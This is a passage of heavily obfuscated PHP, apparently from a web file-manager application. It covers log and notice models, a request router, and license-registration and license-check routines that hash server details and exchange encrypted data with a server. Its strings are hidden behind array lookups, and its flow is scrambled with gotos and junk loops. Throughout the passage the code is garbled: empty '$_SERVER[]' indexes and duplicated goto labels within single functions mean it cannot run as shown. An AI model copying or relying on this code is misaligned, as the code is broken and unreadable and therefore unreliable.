$e[$B[85]][$B[404]] == $B[1174]) { $A՘[] = $eȥ[$B[393]]; unset($Aȟ[$Cם]); continue; } goto eʌͶ; Eͭ: } $eȥ[$B[431]] = $e; goto B; B: unset($eȥ[$B[2108]]); $F⠱[] = $eȥ; goto a; c°Ƕ: $eȥ[$B[1859]] = $F; $e = json_decode($eȥ[$B[431]], !0); $eȥ[$B[2099]] = isset($e[$B[2099]]) ? $e[$B[2099]] : $B[33]; goto Aڇī; aԍ: $eȥ[$B[28]] = isset($F[$B[28]]) ? $F[$B[28]] : LNG($B[2102]); $eȥ[$B[1965]] = isset($F[$B[1965]]) ? $F[$B[1965]] : $B[33]; $eȥ[$B[1436]] = isset($bꆖ[$AѠǧ]) ? $bꆖ[$AѠǧ] : $Cֲޙ; goto c°Ƕ; a: } $this->clearSystemPathLog($A՘); goto eʗ; cط: $B =& $_SERVER[]; $B泺 = array_to_keyvalue($Aȟ, $B[33], $B[1533]); $aχ = Model($B[519])->userListInfo(array_unique($B泺)); goto B؄; eʗ: return $F⠱; goto C; B؄: $a谄 = $this->getSourceList($Aȟ); $bꆖ = $this->typeAll(); $F⠱ = array(); goto d; C: } private function clearSystemPathLog($Fæ) { $Eߺ =& $_SERVER[]; if (count($Fæ) == 0) { return; } $EĿ = array($Eߺ[393] => array($Eߺ[7], array_unique($Fæ))); $this->where($EĿ)->delete(); } public function deviceList($F, $CБ݄ = 0) { $bￎ =& $_SERVER[]; $Fц = array($bￎ[1533] => $F, $bￎ[194] => array($bￎ[973], $CБ݄), $bￎ[29] => $bￎ[1642]); $A氫 = array(); $D = $this->field($bￎ[2109])->where($Fц)->order($bￎ[1926])->limit(50)->select(); foreach ($D as $a => $C) { goto bֳ; D݌: $this->ipAddress($C); $C[$bￎ[431]] = $d܇; $A氫[$dᤍؙ] = $C; goto fʑ; bѩ: unset($d܇[$bￎ[2099]]); $dᤍؙ = $this->deviceType($d܇[$bￎ[1917]]); if (isset($A氫[$dᤍؙ])) { continue; } goto D݌; bֳ: if ($a > 0 && abs($C[$bￎ[194]] - $D[$a - 1][$bￎ[194]]) < 5) { continue; } $d܇ = json_decode($C[$bￎ[431]], !0); $C[$bￎ[2099]] = isset($d܇[$bￎ[2099]]) ? $d܇[$bￎ[2099]] : $bￎ[33]; goto bѩ; fʑ: } return array_values($A氫); } public function deviceType($Bф妾) { return $Bф妾; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x6e\157\x74\151\x63\x65\x4c\151\x73\164"; public $field = array("\156\141\155\145", "\x63\157\x6e\x74\x65\x6e\164", "\141\x75\164\150", "\x6d\157\144\145", "\164\151\155\x65", "\164\x79\x70\x65", "\154\x65\x76\x65\x6c", "\x65\x6e\x61\142\154\145", "\163\157\x72\164"); public function listData($F񧱝 = false, $Dű = "\x73\157\162\x74", $A = false) { return parent::listData($F񧱝, $Dű, $A); } public function add($B) { $a =& $_SERVER[]; $Eᦇ = time(); if ($B[$a[12]] == $a[2110]) { $Eᦇ = strtotime($B[$a[197]]); } $B[$a[197]] = $Eᦇ; return parent::insert($B); } public function update($cމ, $Bݝ) { goto E; E: $E =& $_SERVER[]; $AĈ = $this->listData($cމ); if (!$AĈ) { return !1; } goto f; Bʳ: return parent::update($cމ, $Bݝ); goto D܂雜; f: $eНż = time(); if ($Bݝ[$E[12]] == $E[2110]) { $eНż = strtotime($Bݝ[$E[197]]); } $Bݝ[$E[197]] = $eНż; goto Bʳ; D܂雜: } public function remove($Fܬ͂) { $F = $this->listData($Fܬ͂); if (!$F || $F[$_SERVER[][1174]]) { return !1; } return parent::remove($Fܬ͂); } public function sort($Bц, $C) { return parent::update($Bц, $C); } public function enable($A, $Bʄ) { return parent::update($A, array($_SERVER[][2111] => $Bʄ)); } private function initUserOption() { $F˙ =& $_SERVER[]; $this->optionType = $F˙[2112]; $this->modelType = $F˙[2113]; $this->field = array($F˙[2114], $F˙[28], $F˙[197], $F˙[29], $F˙[2115], $F˙[715], $F˙[189]); } public function userNoticeGet($d = false) { $this->initUserOption(); return parent::listData($d, $_SERVER[][393], !0); } public function userNoticeAdd($aٍ) { $fԞכٝ =& $_SERVER[]; $this->initUserOption(); $b҃Ѡ = $this->findByKey($fԞכٝ[2114], $aٍ[$fԞכٝ[393]]); if ($b҃Ѡ) { return !0; } $d刄 = array($fԞכٝ[2114] => $aٍ[$fԞכٝ[393]], $fԞכٝ[28] => $aٍ[$fԞכٝ[28]], $fԞכٝ[197] => $aٍ[$fԞכٝ[197]], $fԞכٝ[29] => isset($aٍ[$fԞכٝ[29]]) ? $aٍ[$fԞכٝ[29]] : 1, $fԞכٝ[2115] => isset($aٍ[$fԞכٝ[2115]]) ? $aٍ[$fԞכٝ[2115]] : 0, $fԞכٝ[715] => 0, $fԞכٝ[189] => 0); return parent::insert($d刄); } public function userNoticeEdit($Fɱօ, $eʂ) { $this->initUserOption(); return parent::update($Fɱօ, $eʂ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\x65\x6d\x5f\157\x70\164\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\x72\157\154\145", "\x72\157\x6c\x65\x47\x72\157\165\x70", "\x72\145\x67\x69\163\x74", "\x65\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($E볏) { return "\123\x79\x73\164\145\155\117\x70\x74\151\x6f\156\137{$E볏}"; } protected function optionDefault($F = '') { $Dƃ =& $_SERVER[]; if ($F == $Dƃ[33]) { return $GLOBALS[$Dƃ[6]][$Dƃ[378]]; } } } goto b; D: while ($eۋ < $_SERVER[][591]) { if ($eۋ >= 0) { break; } $eۋ++; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\x6e\x64\x65\170"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($B磒) { goto C; f: $this->defaultAction = $bήʳ[2] ? $bήʳ[2] : $this->defaultAction; $B = $A䦞Մ[596]; if (!$B) { return; } goto Eզ; C: $A䦞Մ =& $_SERVER[]; $E =& $_SERVER[뱊]; $bήʳ = $E[0]($E[1], $E[2]($B磒, $E[1])); goto E茇; E茇: $E = $A䦞Մ[592]; if (strlen($E) < $A䦞Մ[593]) { return; } $this->defaultModule = $bήʳ[0] ? $bήʳ[0] : $this->defaultModule; goto f; f: $d柫 = $A䦞Մ[594]; while (strlen($d柫) < $A䦞Մ[595]) { if (!$d柫) { break; } $d柫++; } $this->defaultController = $bήʳ[1] ? $bήʳ[1] : $this->defaultController; goto f; Eզ: $this->{$_SERVER[뱊][3]}($E[4], array($this, $E[5])); $dČ = $A䦞Մ[597]; if (strlen($dČ) < $A䦞Մ[595]) { die; } goto d; d: } public function appRun($f) { goto B΋; a: $B­ݺ[17]($f); $B­ݺ[13](array($B­ݺ[14], $B­ݺ[15]), $E . $B­ݺ[18], $f); $E = $_SERVER[][598]; goto B; FΦǞ: $E = $B­ݺ[7]; if ($d == $B­ݺ[8]) { $E = $B­ݺ[9]; $bʛ[0] = $B­ݺ[10]; $bʛ[1] = $bʛ[1] . $B­ݺ[11]; $f = $B­ݺ[12]($B­ݺ[1], $bʛ); $f = $B­ݺ[2]($f, $B­ݺ[1]); } $B­ݺ[13](array($B­ݺ[14], $B­ݺ[15]), $E . $B­ݺ[16], $f); goto a; B΋: $B­ݺ =& $_SERVER[뱊]; $bʛ = $B­ݺ[0]($B­ݺ[1], $f); $d = $B­ݺ[6]($bʛ[0]); goto FΦǞ; B: } private function autorun() { goto f쉏; C: foreach ($config[$bڌߌ[20]] as $a䃫 => $dǌɑ) { $this->{$_SERVER[뱊][21]}($dǌɑ); $b܂ = $F[600]; if (strlen($b܂) < $F[601]) { return; } } goto b; f쉏: $F =& $_SERVER[]; $bڌߌ =& $_SERVER[뱊]; global $config; goto aǙ; aǙ: $CϢ = $F[599]; if (!$CϢ) { die; } if ($bڌߌ[19]($config[$bڌߌ[20]]) == 0) { return; } goto C; b: } private function pdlf9fb3dcb9() { goto c; fְ̢: $cո = $aꨴ[602]; if (!$cո) { return; } $DǛĆ = $GLOBALS[$eʉ[22]][$eʉ[23]][0]; goto C; F: $cٚߒ = $aꨴ[605]; if (!$cٚߒ) { return; } $GLOBALS[$eʉ[22]][$eʉ[28]] = $eʉ[29]($eʉ[1], $GLOBALS[$eʉ[22]][$eʉ[23]]); goto BѲߜ; BѲߜ: $c̈Ǒ = $aꨴ[606]; if (strlen($c̈Ǒ) < $aꨴ[595]) { die; } goto c㣝; c: $aꨴ =& $_SERVER[]; $eʉ =& $_SERVER[뱊]; $D񐘯 = $eʉ[8]; goto fְ̢; Bʻ: $a = $eʉ[26]($GLOBALS[$eʉ[22]][$eʉ[23]], 1); $A܄ = $aꨴ[604]; $GLOBALS[$eʉ[22]][$eʉ[23]] = $eʉ[27]($F򦑒, $a); goto F; Cߛ: $F򦑒 = array($eʉ[8], $f); $b划 = $aꨴ[603]; while (strlen($b划) < $aꨴ[591]) { if (!$b划) { break; } $b划++; } goto Bʻ; C: if (!$DǛĆ || $eʉ[24]($DǛĆ) <= $eʉ[24]($D񐘯)) { return; } if ($eʉ[6]($eʉ[25]($DǛĆ, -$eʉ[24]($D񐘯))) != $D񐘯) { return; } $f = $eʉ[25]($DǛĆ, 0, -$eʉ[24]($D񐘯)); goto Cߛ; c㣝: } private function uovyce2e6d3b() { goto E; E: $Aې =& $_SERVER[]; $AӨ =& $_SERVER[뱊]; if ($GLOBALS[$AӨ[22]][$AӨ[28]] != $AӨ[10]) { return; } goto DǴ; b񭣔: $C = $AӨ[31]; if (!$AӨ[32]($B, $C)) { return; } $e = $AӨ[33]($B, $C); goto c; c: $e = $AӨ[25]($B, $e + $AӨ[24]($C)); $C = $Aې[608]; $AӨ[34]($AӨ[35], $e, $eϮ); goto A٨ޘ; DǴ: $B = $_SERVER[$AӨ[30]]; $bɤ = $Aې[607]; if (!$bɤ) { return; } goto b񭣔; A٨ޘ: $fʠ؊ = $Aې[609]; if (strlen($fʠ؊) < $Aې[595]) { return; } $e = $AӨ[2]($eϮ[0][0], $AӨ[36]); goto E; E: $GLOBALS[$AӨ[22]][$AӨ[23]] = $AӨ[0]($AӨ[36], $e); $GLOBALS[$AӨ[22]][$AӨ[28]] = $AӨ[29]($AӨ[1], $GLOBALS[$AӨ[22]][$AӨ[23]]); goto E±; E±: } public function run() { goto e񴑖; c哏׉: $DЌɼ[39]($DЌɼ[43], MOD . $DЌɼ[1] . ST . $DЌɼ[1] . ACT); $_SERVER[$DЌɼ[44]] = $DЌɼ[6](ACTION); $this->{$_SERVER[뱊][45]}(); goto Bƌ; b: $ȃޒ = $F[610]; $this->{$_SERVER[뱊][38]}(); $e۽ز = $GLOBALS[$DЌɼ[22]][$DЌɼ[23]]; goto EҖ; e񴑖: $F =& $_SERVER[]; $DЌɼ =& $_SERVER[뱊]; $this->{$_SERVER[뱊][37]}(); goto b; Bƌ: $e = $F[612]; if (strlen($e) < $F[593]) { return; } if ($DЌɼ[19]($e۽ز) >= 3) { $this->{$_SERVER[뱊][21]}($A); } else { $this->{$_SERVER[뱊][21]}(ACTION); } goto E܎; C֡: $DЌɼ[39]($DЌɼ[40], isset($e۽ز[0]) && $e۽ز[0] ? $e۽ز[0] : $this->defaultModule); $DЌɼ[39]($DЌɼ[41], isset($e۽ز[1]) && $e۽ز[0] ? $e۽ز[1] : $this->defaultController); $DЌɼ[39]($DЌɼ[42], isset($e۽ز[2]) && $e۽ز[0] ? $e۽ز[2] : $this->defaultAction); goto c哏׉; EҖ: $BԿ = $F[611]; if (strlen($BԿ) < $F[595]) { die; } $A = $GLOBALS[$DЌɼ[22]][$DЌɼ[28]]; goto C֡; E܎: } private $jowbb2480663 = array(); private $vtga38cf3c9c = ''; public function tfej1748c446() { goto A; DՋ: $aĬ = $Fڜ[615]; while ($aĬ < $Fڜ[601]) { if ($aĬ >= 0) { break; } $aĬ++; } $this->{$_SERVER[뱊][3]}($B낳[53], array($this, $B낳[54])); goto C; A랷も: $this->{$_SERVER[뱊][3]}($B낳[57], array($this, $B낳[58])); $E΍۶ = $Fڜ[617]; while ($E΍۶ < $Fڜ[595]) { if ($E΍۶ >= 0) { break; } $E΍۶++; } goto bĠƹ; f: $this->{$_SERVER[뱊][49]}(); $D搙Ԩ = $Fڜ[614]; while ($D搙Ԩ < $Fڜ[595]) { if ($D搙Ԩ >= 0) { break; } $D搙Ԩ++; } goto DѺġ; A: $Fڜ =& $_SERVER[]; $B낳 =& $_SERVER[뱊]; $this->{$_SERVER[뱊][46]}(); goto BΨ; DѺġ: $this->{$_SERVER[뱊][50]}(); $this->{$_SERVER[뱊][51]}(); $this->{$_SERVER[뱊][52]}(); goto DՋ; C: $this->{$_SERVER[뱊][3]}($B낳[55], array($this, $B낳[56])); $a̓ = $Fڜ[616]; while (strlen($a̓) < $Fڜ[593]) { if (!$a̓) { break; } $a̓++; } goto A랷も; BΨ: $this->{$_SERVER[뱊][47]}(); $aˮ = $Fڜ[613]; $this->{$_SERVER[뱊][48]}(); goto f; bĠƹ: $this->{$_SERVER[뱊][3]}($B낳[59], array($this, $B낳[60])); $CΨ = $Fڜ[618]; if (!$CΨ) { return; } goto BӺ; BӺ: } public function jkzlccb55bf6($C) { goto b; E: $Eܑ = $BǊ[620]; while ($Eܑ < $BǊ[621]) { if ($Eܑ >= 0) { break; } $Eܑ++; } unset($C[$EẐ[109]][$EẐ[111]][$EẐ[113]]); goto b; Aޗ: $Fߕǣ = $BǊ[619]; while (strlen($Fߕǣ) < $BǊ[601]) { if (!$Fߕǣ) { break; } $Fߕǣ++; } $c𧃤 = array($EẐ[64], $EẐ[65], $EẐ[66], $EẐ[67], $EẐ[68], $EẐ[69], $EẐ[70], $EẐ[71], $EẐ[72], $EẐ[73], $EẐ[74], $EẐ[75], $EẐ[76], $EẐ[77], $EẐ[78], $EẐ[79], $EẐ[80], $EẐ[81], $EẐ[82], $EẐ[83], $EẐ[84], $EẐ[85], $EẐ[86], $EẐ[87], $EẐ[88], $EẐ[89], $EẐ[90], $EẐ[91], $EẐ[92], $EẐ[93], $EẐ[94], $EẐ[95], $EẐ[96], $EẐ[97], $EẐ[98], $EẐ[99], $EẐ[100], $EẐ[101], $EẐ[102], $EẐ[103], $EẐ[104], $EẐ[105], $EẐ[106]); goto cۋ; Cݷ: $C[$EẐ[109]][$EẐ[110]][$EẐ[115]] = array($EẐ[116] => (int) $cėõ[$EẐ[117]], $EẐ[118] => (int) $EẐ[119]($cėõ, $EẐ[120], 0)); $C[$EẐ[121]][$EẐ[122]] = $EẐ[123]($EẐ[124])->{$_SERVER[뱊][125]}(); $fɺғ = $BǊ[624]; goto cկŶ; cկŶ: $C[$EẐ[121]][$EẐ[126]] = $EẐ[127]($_SERVER[$EẐ[128]] . $a[$EẐ[129]]); $C[$EẐ[121]][$EẐ[130]] = $EẐ[131]($EẐ[132]()); $C[$EẐ[121]][$EẐ[133]] = $this->vtga38cf3c9c; goto CĹ퉄; b: $BǊ =& $_SERVER[]; $EẐ =& $_SERVER[뱊]; $a = $EẐ[61]($EẐ[62])->{$_SERVER[뱊][63]}(); goto Aޗ; b: $d◖ = $BǊ[622]; if (strlen($d◖) < $BǊ[601]) { die; } unset($C[$EẐ[109]][$EẐ[110]][$EẐ[76]]); goto b; CĹ퉄: if ($a[$EẐ[133]] != $EẐ[134]) { $C[$EẐ[121]][$EẐ[135]] = $a[$EẐ[135]]; $C[$EẐ[121]][$EẐ[136]] = $a[$EẐ[136]]; $E = $EẐ[137](10) . $this->vtga38cf3c9c . $EẐ[137](5); $C[$EẐ[109]][$EẐ[138]][$EẐ[139]] = $this->{$_SERVER[뱊][140]}($E, $C[$EẐ[121]][$EẐ[126]]); } if ($this->vtga38cf3c9c == $EẐ[134]) { $C[$EẐ[109]][$EẐ[110]][$EẐ[115]][$EẐ[120]] = 0; } $C[$EẐ[121]][$EẐ[141]] = $EẐ[119]($this->jowbb2480663, $EẐ[142], $EẐ[10]); goto a럥; b: unset($C[$EẐ[109]][$EẐ[110]][$EẐ[114]]); $EĢ = $BǊ[623]; if (strlen($EĢ) < $BǊ[591]) { die; } goto Cݷ; cۋ: foreach ($c𧃤 as $bÌ) { $Aҋ = $GLOBALS[$EẐ[107]][$EẐ[108]][$bÌ]; if (isset($a[$bÌ])) { $Aҋ = $a[$bÌ]; } $C[$EẐ[109]][$EẐ[110]][$bÌ] = $Aҋ; } $cėõ = $C[$EẐ[109]][$EẐ[110]][$EẐ[76]]; unset($C[$EẐ[109]][$EẐ[111]][$EẐ[112]]); goto E; a럥: $C[$EẐ[121]][$EẐ[143]] = $EẐ[119]($this->jowbb2480663, $EẐ[144], $EẐ[10]); if ($EẐ[119]($GLOBALS, $EẐ[145]) && $this->config[$EẐ[146]]) { $C[$EẐ[121]][$EẐ[147]] = WEB_ROOT; } return $C; goto a誳; a誳: } private function jnqibe33f033() { goto e; e: $b =& $_SERVER[]; $d䲄亴 =& $_SERVER[뱊]; if ($_SERVER[$d䲄亴[44]] == $d䲄亴[148]) { $B = array($d䲄亴[133] => $this->vtga38cf3c9c, $d䲄亴[149] => $this->{$_SERVER[뱊][150]}(), $d䲄亴[151] => $d䲄亴[61]($d䲄亴[152])->{$_SERVER[뱊][153]}()); if ($this->vtga38cf3c9c != $d䲄亴[134]) { $CãŪ = $d䲄亴[119]($this->jowbb2480663, $d䲄亴[154]); if ($CãŪ) { $B[$d䲄亴[155]] = $CãŪ; $B[$d䲄亴[156]] = $d䲄亴[157]($d䲄亴[119]($this->jowbb2480663, $d䲄亴[158])); $B[$d䲄亴[159]] = $d䲄亴[119]($this->jowbb2480663, $d䲄亴[144]); } $eᾢس = $d䲄亴[61]($d䲄亴[62])->{$_SERVER[뱊][63]}($d䲄亴[160], $d䲄亴[10], !0); if ($d䲄亴[161]($eᾢس) && $d䲄亴[25]($eᾢس, 0, 1) == $d䲄亴[162]) { $eᾢس = $d䲄亴[163]($eᾢس); } if ($d䲄亴[164]($eᾢس) && $eᾢس[$d䲄亴[165]] && $d䲄亴[32]($eᾢس[$d䲄亴[165]], $d䲄亴[166])) { $C툉 = $d䲄亴[0]($d䲄亴[166], $eᾢس[$d䲄亴[165]]); $B[$d䲄亴[167]] = $C툉[0]; } } $B = $this->{$_SERVER[뱊][168]}($d䲄亴[169]($B), $d䲄亴[127]($d䲄亴[170])); $EϿ = $b[625]; $cŵ = array($d䲄亴[171] => $B); $d䲄亴[13](array($d䲄亴[172], $d䲄亴[173]), $cŵ); } goto Eڣ; Eڣ: if ($this->vtga38cf3c9c == $d䲄亴[134]) { return; } $f꫽ = array($d䲄亴[174], $d䲄亴[175], $d䲄亴[176], $d䲄亴[177], $d䲄亴[178], $d䲄亴[179]); $cᎭ = $d䲄亴[61]($d䲄亴[62])->{$_SERVER[뱊][63]}(); goto d; d: $B = $b[626]; if (!$B) { die; } $cŵ = array($d䲄亴[180] => $cᎭ[$d䲄亴[64]], $d䲄亴[181] => $cᎭ[$d䲄亴[65]], $d䲄亴[182] => $d䲄亴[10]); goto f; f: foreach ($f꫽ as $e) { if (!isset($cᎭ[$e]) || !$cᎭ[$e]) { continue; } $cŵ[$e] = $cᎭ[$e]; } $d䲄亴[13](array($d䲄亴[172], $d䲄亴[173]), $cŵ); goto a􅆲; a􅆲: } private function ayzb603a1230() { goto dˆ; C⭒: while (strlen($aݮ) < $d[591]) { if (!$aݮ) { break; } $aݮ++; } $this->jowbb2480663 = $F; $a̛ = $d[637]; goto a񳫐; Cιƃ: $A햖 = $dӑʥ[137](16); $eς = $A햖 . $bՋ[$dӑʥ[133]] . $this->{$_SERVER[뱊][168]}($dӑʥ[127]($bՋ[$dӑʥ[230]]), $A햖); $cø = $d[629]; goto aϩ; dڑ: $BưӉ = $dӑʥ[127]($_SERVER[$dӑʥ[128]] . $dӑʥ[236]($e܎) . $bՋ[$dӑʥ[232]]); $B = $d[631]; if (!$B) { return; } goto d; c۞: if (strlen($d) < $d[593]) { die; } $dӑʥ[61]($dӑʥ[11])->{$_SERVER[뱊][248]}($cơȾ[$dӑʥ[249]], array($dӑʥ[250] => $B͇ᓞ)); $aݮ = $d[636]; goto C⭒; Aߡ: if (!$Dװ) { return; } $B͇ᓞ[$eȏ] = $C膍; $d = $d[635]; goto c۞; d: $d = array($dӑʥ[186] => $eψ[$dӑʥ[186]], $dӑʥ[189] => $dӑʥ[137](16), $dӑʥ[190] => $dӑʥ[170], $dӑʥ[191] => $dӑʥ[192], $dӑʥ[193] => $_SERVER[$dӑʥ[194]], $dӑʥ[195] => $_SERVER[$dӑʥ[196]], $dӑʥ[197] => $_SERVER[$dӑʥ[198]], $dӑʥ[126] => $e, $dӑʥ[199] => $dӑʥ[61]($dӑʥ[62])->{$_SERVER[뱊][63]}($dӑʥ[160])); $Fꘝ = $d[627]; while ($Fꘝ < $d[621]) { if ($Fꘝ >= 0) { break; } $Fꘝ++; } goto Aʞь; e: $E߅Ȉ = $d[638]; while ($E߅Ȉ < $d[595]) { if ($E߅Ȉ >= 0) { break; } $E߅Ȉ++; } Cache::set($dӑʥ[252] . $dӑʥ[127]($e܎ . $dӑʥ[253]), $dӑʥ[10]); goto f; BɃŻ: if (!isset($eψ[$dӑʥ[186]]) || $dӑʥ[24]($eψ[$dӑʥ[186]]) != 16) { $dӑʥ[187]($dӑʥ[188] . $eψ[$dӑʥ[186]], !1); } $e܎ = $dӑʥ[61]($dӑʥ[62])->{$_SERVER[뱊][63]}($dӑʥ[129]); $e = $dӑʥ[127]($_SERVER[$dӑʥ[128]] . $e܎); goto d; aϩ: while ($cø < $d[595]) { if ($cø >= 0) { break; } $cø++; } $bՋ[$dӑʥ[136]] = $dӑʥ[131]($dӑʥ[236]($this->{$_SERVER[뱊][168]}($eς, $dӑʥ[238]))); $A⽾ = $d[630]; goto fߪ; f: $dӑʥ[187]($dӑʥ[219]($dӑʥ[229]), !0); $A = $d[639]; if (!$A) { die; } goto c뗆; eԕ喦: $D£ = $this->{$_SERVER[뱊][221]}($F[$dӑʥ[222]]); if (!$D£ || $D£ != $F[$dӑʥ[158]]) { $C쏟 = array($dӑʥ[223] => $dӑʥ[61]($dӑʥ[62])->{$_SERVER[뱊][63]}($dӑʥ[129]), $dӑʥ[224] => $_SERVER[$dӑʥ[128]], $dӑʥ[225] => $dӑʥ[226](), $dӑʥ[195] => $_SERVER[$dӑʥ[196]]); $d֐ = $this->{$_SERVER[뱊][227]}($dӑʥ[169]($C쏟)); $this->{$_SERVER[뱊][205]}($dӑʥ[228] . $d֐); $dӑʥ[187]($dӑʥ[219]($dӑʥ[229]), !0); } $bՋ = array($dӑʥ[230] => $F[$dӑʥ[231]], $dӑʥ[232] => $F[$dӑʥ[233]], $dӑʥ[234] => $dӑʥ[137](16), $dӑʥ[133] => $F[$dӑʥ[235]]); goto B; A: $cơȾ = $A[$dӑʥ[247]]; $B͇ᓞ = array(); $Dװ = $d[634]; goto Aߡ; d: $fĲ = $d[633]; if (!$fĲ) { return; } $A = $dӑʥ[244]($dӑʥ[61]($dӑʥ[11])->{$_SERVER[뱊][245]}(), $dӑʥ[246]); goto A; B: if ($d[$dӑʥ[189]]) { $bՋ[$dӑʥ[234]] = $d[$dӑʥ[189]]; } $Eȍ = $dӑʥ[25]($dӑʥ[127]($bՋ[$dӑʥ[232]]), 10, 10); $fա = $Eȍ . $bՋ[$dӑʥ[133]] . $bՋ[$dӑʥ[234]]; goto Fު; Fު: $bՋ[$dӑʥ[135]] = $dӑʥ[236]($dӑʥ[131]($this->{$_SERVER[뱊][168]}($fա, $dӑʥ[237]))); $E = $d[628]; if (strlen($E) < $d[621]) { die; } goto Cιƃ; dˆ: $d =& $_SERVER[]; $dӑʥ =& $_SERVER[뱊]; if ($_SERVER[$dӑʥ[44]] != $dӑʥ[183]) { return; } goto F; F: if (!$dӑʥ[119]($GLOBALS, $dӑʥ[145])) { die; } $eψ = $GLOBALS[$dӑʥ[22]]; if (isset($eψ[$dӑʥ[184]])) { $this->{$_SERVER[뱊][185]}(); die; } goto BɃŻ; d: $eȏ = $dӑʥ[236]($dӑʥ[25]($BưӉ, 10, 16)); $e = $d[632]; $C膍 = $this->{$_SERVER[뱊][140]}($dӑʥ[169]($F), $BưӉ); goto d; Aʞь: if ($eψ[$dӑʥ[200]] == $dӑʥ[201]) { $B٠ = $this->{$_SERVER[뱊][168]}($e, $dӑʥ[202]); $d֐ = $this->{$_SERVER[뱊][140]}($dӑʥ[169]($d), $e . $dӑʥ[203], 3); $d֐ = $d֐ . $dӑʥ[204] . $_SERVER[$dӑʥ[194]]; $Dԏ = $this->{$_SERVER[뱊][205]}($dӑʥ[206] . $B٠ . $dӑʥ[207] . $d֐, -1); $dӑʥ[187]($Dԏ, !0); } else { if ($eψ[$dӑʥ[200]] == $dӑʥ[208]) { $cث = $dӑʥ[25]($dӑʥ[127]($dӑʥ[209] . $e), 12, 15) . $dӑʥ[210]; $d֐ = $this->{$_SERVER[뱊][211]}($dӑʥ[2]($eψ[$dӑʥ[212]]), $cث, 2); $BˬՔ = $dӑʥ[213]($d֐, !0); if (!$dӑʥ[164]($BˬՔ) || !$dӑʥ[164]($BˬՔ[$dӑʥ[214]]) || $BˬՔ[$dӑʥ[186]] != !0) { $C = $dӑʥ[215]; $E쒱 = $BˬՔ[$dӑʥ[214]] ? $dӑʥ[216] . $BˬՔ[$dӑʥ[214]] : $C; $dӑʥ[187]($E쒱, !1); } else { $d[$dӑʥ[189]] = $BˬՔ[$dӑʥ[214]][$dӑʥ[217]]; } } else { $BˬՔ = $this->{$_SERVER[뱊][205]}($dӑʥ[218], $d, 10); } } if (!$dӑʥ[164]($BˬՔ) || !$dӑʥ[164]($BˬՔ[$dӑʥ[214]]) || $BˬՔ[$dӑʥ[186]] != !0) { $C = $dӑʥ[219]($dӑʥ[220]); $E쒱 = $BˬՔ[$dӑʥ[214]] ? $dӑʥ[216] . $BˬՔ[$dӑʥ[214]] : $C; $dӑʥ[187]($E쒱, !1); } $F = $BˬՔ[$dӑʥ[214]]; goto eԕ喦; a񳫐: if (!$a̛) { die; } $this->vtga38cf3c9c = $bՋ[$dӑʥ[133]]; $this->{$_SERVER[뱊][251]}(); goto e; fߪ: if (!$A⽾) { return; } if ($F[$dӑʥ[239]] && $F[$dӑʥ[239]] >= 1) { $dӑʥ[61]($dӑʥ[62])->{$_SERVER[뱊][240]}($dӑʥ[241], $dӑʥ[242]); } $dӑʥ[61]($dӑʥ[62])->{$_SERVER[뱊][243]}($bՋ); goto dڑ; c뗆: } private function licenseRegistSuccess() { $e =& $_SERVER[뱊]; $fې = $e[61]($e[62])->{$_SERVER[뱊][63]}(); if ($fې[$e[93]] != $e[242]) { $e[61]($e[62])->{$_SERVER[뱊][243]}($e[93], $e[242]); } $e[123]($e[254])->{$_SERVER[뱊][255]}(!0); } private function vytdda1157d0() { $A =& $_SERVER[뱊]; $A[61]($A[62])->{$_SERVER[뱊][243]}(array($A[230] => $A[10], $A[232] => $A[10], $A[133] => $A[134], $A[135] => $A[10], $A[136] => $A[10])); $A[61]($A[62])->{$_SERVER[뱊][240]}($A[241], $A[256]); $a = $_SERVER[][640]; $this->jowbb2480663 = array(); $this->vtga38cf3c9c = $A[134]; } private function mjnq13bb5596() { goto a߆; CҪ: if (!$A턐) { return; } if ($FӦۯ[$F[133]] == $F[134]) { return; } $BԒ = $F[61]($F[62])->{$_SERVER[뱊][63]}($F[129]); goto e省⭙; e菳: while (strlen($b) < $fɅ[591]) { if (!$b) { break; } $b++; } if (!$F[164]($bܞԎ) || !isset($bܞԎ[$F[257]]) || $F[258]() - $bܞԎ[$F[257]] >= 60) { $b = $F[244]($F[61]($F[11])->{$_SERVER[뱊][245]}(), $F[246]); $bƖ؅ = $b[$F[247]]; $e = $F[127]($_SERVER[$F[128]] . $F[236]($BԒ) . $FӦۯ[$F[232]]); $E˸ = $F[236]($F[25]($e, 10, 16)); $bܞԎ = $this->{$_SERVER[뱊][211]}($bƖ؅[$F[107]][$E˸], $e); $bܞԎ = $F[213]($bܞԎ, !0); } if (!$F[164]($bܞԎ)) { return $this->{$_SERVER[뱊][185]}(); } goto c֡; c֡: $b = $F[157]($bܞԎ[$F[158]]); if ($F[258]() >= $b) { return $this->{$_SERVER[뱊][185]}(); } if ($F[258]() - $bܞԎ[$F[257]] > 20) { $bܞԎ[$F[257]] = $F[258](); Cache::set($cΕ, $bܞԎ); } goto eխɫ; eխɫ: $this->jowbb2480663 = $bܞԎ; $this->vtga38cf3c9c = $FӦۯ[$F[133]]; goto B̒; e省⭙: $cΕ = $F[252] . $F[127]($BԒ . $F[253]); $bܞԎ = Cache::get($cΕ); $b = $fɅ[642]; goto e菳; F: $this->vtga38cf3c9c = $F[134]; $FӦۯ = $F[61]($F[62])->{$_SERVER[뱊][63]}(); $A턐 = $fɅ[641]; goto CҪ; a߆: $fɅ =& $_SERVER[]; $F =& $_SERVER[뱊]; $_SERVER[$F[196]] = $F[119]($_SERVER, $F[196], APP_HOST); goto F; B̒: } private function dlov5f285774() { $b䍹 =& $_SERVER[뱊]; $B갬˿ = $GLOBALS[$b䍹[22]]; $C = $_SERVER[$b䍹[44]]; if ($C == $b䍹[259] && $this->vtga38cf3c9c == $b䍹[134]) { $b䍹[187]($b䍹[219]($b䍹[260]), !1, $b䍹[261]); } $D͊ = array($b䍹[262], $b䍹[263]); if ($b䍹[264]($C, $D͊)) { if ($this->vtga38cf3c9c == $b䍹[134] && isset($B갬˿[$b䍹[265]])) { $b䍹[187]($b䍹[219]($b䍹[260]), !1, $b䍹[261]); die; } $cޠͬ = $this->{$_SERVER[뱊][150]}(); if ($cޠͬ != $b䍹[266]($b䍹[267])) { if ($cޠͬ <= 